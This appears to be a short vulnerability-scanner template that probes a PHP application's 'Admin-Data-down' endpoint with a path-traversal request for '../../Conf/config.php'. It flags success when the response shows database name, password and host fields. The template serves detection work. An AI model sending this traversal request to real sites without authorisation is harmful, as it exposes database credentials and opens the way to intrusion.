http:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - <?php
    - db_name
    - db_pwd
    - db_host
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.php?s=Admin-Data-down&id=../../Conf/config.php'
